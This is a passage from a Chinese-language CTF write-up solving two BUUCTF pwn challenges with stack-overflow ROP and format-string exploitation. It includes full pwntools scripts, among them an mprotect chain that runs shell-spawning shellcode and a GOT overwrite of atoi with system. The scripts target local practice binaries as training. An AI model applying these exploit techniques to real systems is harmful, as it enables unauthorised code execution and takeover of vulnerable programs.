    v4 <span class="token operator">=</span> <span class="token function">getc</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">!=</span> <span class="token number">255</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>v4<span class="token punctuation">;</span>
      <span class="token keyword">do</span>
      <span class="token punctuation">{</span>
        <span class="token function">putchar</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v6 <span class="token operator">=</span> <span class="token function">getc</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>v6<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">255</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>给了个get flag函数</p>
<p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/APwn/buuctf/get_started_3dsctf_2016'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<h4 id="基本getshell思路"><a href="#基本getshell思路" class="headerlink" title="基本getshell思路"></a>基本getshell思路</h4><p>1.利用栈溢出跳转到v2 = fopen(“flag.txt”, “rt”); 地址处即可读到flag</p>
<p>2.利用mprotect函数修改程序地址可读可写可执行 布置shellcode getshell</p>
<h4 id="过程一"><a href="#过程一" class="headerlink" title="过程一"></a>过程一</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">gdb<span class="token operator">-</span>peda$ file get_started_3dsctf_2016
Reading symbols <span class="token keyword">from</span> get_started_3dsctf_2016<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>done<span class="token punctuation">.</span>
gdb<span class="token operator">-</span>peda$ b main
Breakpoint <span class="token number">1</span> at <span class="token number">0x8048a20</span>
gdb<span class="token operator">-</span>peda$ pattern create <span class="token number">300</span>
<span class="token string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'</span>
gdb<span class="token operator">-</span>peda$ r
gdb<span class="token operator">-</span>peda$ c
 ► f <span class="token number">0</span> <span class="token number">41416341</span>
Program received signal SIGSEGV <span class="token punctuation">(</span>fault address <span class="token number">0x41416341</span><span class="token punctuation">)</span>
gdb<span class="token operator">-</span>peda$ pattern offset <span class="token number">0x41416341</span>
<span class="token number">1094804289</span> found at offset<span class="token punctuation">:</span> <span class="token number">56</span>
</code></pre>
<p>得到偏移后覆盖ret为 fopen(“flag.txt”, “rt”);地址</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./get_started_3dsctf_2016'</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">56</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x80489B8</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h4 id="过程二"><a href="#过程二" class="headerlink" title="过程二"></a>过程二</h4><p>来自引用<a href="https://blog.csdn.net/roland_sun/article/details/33728955\" target="_blank" rel="noopener">https://blog.csdn.net/roland_sun/article/details/33728955\</a></p>
<p>在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mmap.h></span></span>
<span class="token keyword">int</span> <span class="token function">mprotect</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>start<span class="token punctuation">,</span> size_t len<span class="token punctuation">,</span> <span class="token keyword">int</span> prot<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p>
<p>1）PROT_READ：表示内存段内的内容可写；</p>
<p>2）PROT_WRITE：表示内存段内的内容可读；</p>
<p>3）PROT_EXEC：表示内存段中的内容可执行；</p>
<p>4）PROT_NONE：表示内存段中的内容根本没法访问</p>
<p>利用描述：</p>
<p>Start：需要修改的起始地址</p>
<p>len:该段大小 通过End-Start 可以得到size</p>
<p>prot：设置地址段权限 可读：r 4 可写：w 2 可执行：x 1</p>
<p>在gdb中找一个权限较高的地址</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>gdb-peda$ vmmap
Start      End        Perm    Name
0x08048000 0x080ea000 r-xp    /home/ios/APwn/buuctf/get_started_3dsctf_2016
0x080ea000 0x080ec000 rw-p    /home/ios/APwn/buuctf/get_started_3dsctf_2016
0x080ec000 0x0810f000 rw-p    [heap]
0xf7ff9000 0xf7ffc000 r--p    [vvar]
0xf7ffc000 0xf7ffe000 r-xp    [vdso]
0xfffdd000 0xffffe000 rw-p    [stack]
</code></pre><p>选择一段 0x080ea000 0x080ec000 rw-p</p>
<p>利用栈溢出 覆盖ret到mprotect函数+rop_gadget+传递参数修改权限为rwx</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./get_started_3dsctf_2016'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
ss<span class="token operator">=</span><span class="token number">0x080ea000</span><span class="token comment" spellcheck="true">#size=0x2000</span>
mprotect<span class="token operator">=</span><span class="token number">0x806ec80</span>
main<span class="token operator">=</span><span class="token number">0x8048a20</span>
pop3<span class="token operator">=</span><span class="token number">0x080509a5</span><span class="token comment" spellcheck="true"># pop ebx ; pop esi ; pop edi ; ret</span>

payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">56</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop3<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#rwx 4 2 1</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
</code></pre>
<p>修改后</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0 f7fcbfd9 __kernel_vsyscall+9
   f 1  806e162 __read_nocancel+24
   f 2  8051ab9 _IO_new_file_underflow+265
   f 3  80548ac _IO_default_uflow+44
   f 4  804f749 gets+281
gdb-peda$ vmmap
Start      End        Perm    Name
0x08048000 0x080ea000 r-xp    /home/ios/APwn/buuctf/get_started_3dsctf_2016
0x080ea000 0x080ec000 rwxp    /home/ios/APwn/buuctf/get_started_3dsctf_2016
0x080ec000 0x080ed000 rw-p    mapped
0x08891000 0x088b3000 rw-p    [heap]
0xf7fc8000 0xf7fcb000 r--p    [vvar]
0xf7fcb000 0xf7fcd000 r-xp    [vdso]
0xff90b000 0xff92c000 rw-p    [stack]
gdb-peda$
</code></pre><p>可以看到成功修改</p>
<p>接着要继续利用rop构造read读入shellcode到0x080ea000 并构造完后返回到0x080ea000 执行shellcode</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">ss<span class="token operator">=</span><span class="token number">0x080ea000</span><span class="token comment" spellcheck="true">#size=0x2000</span>
mprotect<span class="token operator">=</span><span class="token number">0x806ec80</span>
pop3<span class="token operator">=</span><span class="token number">0x080509a5</span><span class="token comment" spellcheck="true"># pop ebx ; pop esi ; pop edi ; ret</span>
shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">56</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop3<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop3<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ss<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#rwx 4 2 1</span>
</code></pre>
<p>这里我们一段一段分析payload</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">56</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop3<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
</code></pre>
<p>首先溢出覆盖ret为mprotect函数利用gadget 以堆栈形式pop 传入参数 </p>
<p>先传入需要修改权限的地址段 ss</p>
<p>传入ss地址段的长度len</p>
<p>传入权限 rwx=4+2+1=7</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>0：没有任何权限
4：可读r
2：可写w
1：可执行x
</code></pre><pre class=" language-python"><code class="language-python"><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop3<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ss<span class="token punctuation">)</span>
<span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"code-caption"</span> data<span class="token operator">-</span>lang<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data<span class="token operator">-</span>trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data<span class="token operator">-</span>label_position<span class="token operator">=</span><span class="token string">"outer"</span> data<span class="token operator">-</span>labels_left<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_right<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
</code></pre>
<p>因为上一段gadget为pop pop pop ret 所以</p>
<p>我们ret 到了read 同样传参方式调用read函数</p>
<p>原型</p>
<pre><code>#include &lt;unistd.h&gt;    
ssize_t read(int fd, void *buf, size_t count);
&lt;p class=&quot;code-caption&quot; data-lang=&quot;&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;outer&quot; data-labels_left=&quot;&quot; data-labels_right=&quot;&quot; data-labels_copy=&quot;&quot;&gt;&lt;span class=&quot;code-caption-label&quot;&gt;&lt;/span&gt;&lt;/p&gt;
</code></pre><p>fd： 是文件描述符,对应0 </p>
<p>buf: 为读出数据的缓冲区</p>
<p>count：为读入的输入长度</p>
<p>最后我们由于使用gadget pop pop pop ret</p>
<p>因为read会将shellcode读入ss地址段 </p>
<p>我们需要ret到ss地址段来执行shellcode</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./get_started_3dsctf_2016'</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'get_started_3dsctf_2016'</span><span class="token punctuation">)</span>
read_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>

<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
ss<span class="token operator">=</span><span class="token number">0x080ea000</span><span class="token comment" spellcheck="true">#size=0x2000</span>
mprotect<span class="token operator">=</span><span class="token number">0x806ec80</span>
main<span class="token operator">=</span><span class="token number">0x8048a20</span>
pop3<span class="token operator">=</span><span class="token number">0x080509a5</span><span class="token comment" spellcheck="true"># pop ebx ; pop esi ; pop edi ; ret</span>
shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">56</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop3<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop3<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ss<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#rwx 4 2 1</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/buuctf$ checksec PWN5
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/APwn/buuctf/PWN5'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<p>简单运行程序 </p>
<p>猜测存在字符串格式化漏洞 用来泄漏canary 接着 存在输入所以可能存在溢出</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST14_4</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ecx</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// et1</span>
  <span class="token keyword">char</span> nptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-80h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-70h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+78h] [ebp-Ch]</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+7Ch] [ebp-8h]</span>

  v9 <span class="token operator">=</span> <span class="token operator">&amp;</span>a1<span class="token punctuation">;</span>
  v8 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">srand</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_804C044<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x63u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello,"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"your passwd:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nptr<span class="token punctuation">,</span> <span class="token number">0xFu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>nptr<span class="token punctuation">)</span> <span class="token operator">==</span> unk_804C044 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ok!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> v5 <span class="token operator">^</span> v8<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">!=</span> v8 <span class="token punctuation">)</span>
    <span class="token function">sub_80493D0</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>发现read处都不存在溢出</p>
<p>但是 main中给出了system(“/bin/sh”)</p>
<p>以及明显的字符串格式化 </p>
<p>我们可以利用字符串格式化修改atoi为system函数地址 接着在第二次read输入“bin/sh” 从而getshell</p>
<p>字符串格式化需要测试偏移 </p>
<p>一般利用</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
</code></pre><p>计算偏移</p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'PWN5'</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'PWN5'</span><span class="token punctuation">)</span>
system<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
atoi<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your name:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token punctuation">{</span>atoi<span class="token punctuation">:</span>system<span class="token punctuation">}</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>在网上看到还有另外一个思路</p>
<p>​    <a href="https://www.cnblogs.com/lxy8584099/p/11826781.html" target="_blank" rel="noopener">第五空间2019 决赛]PWN5</a></p>
<p>因为读入随机数的地址 固定 bss:0x804C044</p>
<p>我们可以修改该地址的随机数为固定值 接着输入相同值即可满足判断 getshell</p>
<p>我们先尝试在0x804C044写入数值</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>addr=0x804C044
payload=p32(addr)+&quot;%10$n&quot;
def debug(addr = &#39;0x80492A6&#39;):
    raw_input(&#39;debug:&#39;)
    gdb.attach(p, &quot;b *&quot; + addr)
debug()
p.sendline(payload)
</code></pre><p>在080492A6处下断检查0x804C044当前值是否固定</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0000</span>│ esp  <span class="token number">0xffae1790</span> —▸ <span class="token number">0x804a027</span> ◂— <span class="token string">'your passwd:'</span>
<span class="token number">01</span><span class="token punctuation">:</span><span class="token number">0004</span>│      <span class="token number">0xffae1794</span> —▸ <span class="token number">0xffae17b8</span> —▸ <span class="token number">0x804c044</span> ◂— <span class="token number">0x4</span>
<span class="token number">02</span><span class="token punctuation">:</span><span class="token number">0008</span>│      <span class="token number">0xffae1798</span> ◂— <span class="token number">0x63</span> <span class="token comment" spellcheck="true">/* 'c' */</span>
<span class="token number">03</span><span class="token punctuation">:</span>000c│      <span class="token number">0xffae179c</span> ◂— <span class="token number">0x0</span>
<span class="token number">04</span><span class="token punctuation">:</span><span class="token number">0010</span>│      <span class="token number">0xffae17a0</span> —▸ <span class="token number">0xffae17de</span> ◂— <span class="token number">0xffff0000</span>
<span class="token number">05</span><span class="token punctuation">:</span><span class="token number">0014</span>│      <span class="token number">0xffae17a4</span> ◂— <span class="token number">0x3</span>
